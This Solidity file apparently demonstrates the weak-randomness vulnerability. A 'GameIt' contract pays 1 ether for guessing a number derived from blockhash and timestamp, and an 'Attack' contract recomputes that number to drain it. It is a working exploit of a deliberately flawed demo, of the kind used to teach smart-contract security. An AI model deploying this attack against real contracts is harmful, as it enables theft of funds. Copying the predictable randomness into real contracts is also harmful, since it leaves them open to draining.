// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;


contract GameIt{
    constructor()payable {}


    function guess(uint256 _num)public{
        uint256 answer = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        if(_num == answer){
            (bool success,)= msg.sender.call{value: 1 ether}("");
            require(success,"failed to  send");
        }
    }
}

contract Attack{
    receive() external payable { }

    function attack(GameIt gameit)public{
        uint256 answer = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        gameit.guess(answer);
    }

    function withdraw()public{
        (bool success,)= msg.sender.call{value: address(this).balance}("");
        require(success,"failed");
    }
   
}